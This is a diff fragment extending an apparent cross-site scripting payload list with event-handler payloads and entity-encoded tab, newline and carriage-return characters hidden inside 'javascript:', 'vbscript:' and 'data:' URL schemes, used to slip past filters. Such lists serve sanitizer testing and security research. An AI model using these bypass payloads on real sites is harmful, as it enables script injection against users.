@@ -475,3 +475,16 @@ id oncommand=alert(1) data="
 # VR/AR contexts (deprecated but may exist)
 <div onvrdisplayactivate=alert(1)>
 <div onvrdisplaypresentchange=alert(1)>
+
+# TAB/LF/CR hidden inside URL schemes (stripped by browsers)
+<a href="ja&#9;vascript:alert(1)">x</a>
+<a href="ja&#x09;vascript:alert(1)">x</a>
+<a href="ja&#10;vascript:alert(1)">x</a>
+<a href="ja&#13;vascript:alert(1)">x</a>
+<a href="ja&Tab;vascript:alert(1)">x</a>
+<a href="ja&NewLine;vascript:alert(1)">x</a>
+<a href="&Tab;javascript:alert(1)">x</a>
+<form action="ja&Tab;vascript:alert(1)">
+<button formaction="ja&#9;vascript:alert(1)">x</button>
+<a href="vb&#9;script:x">x</a>
+<a href="da&#9;ta:text/html,x">x</a>
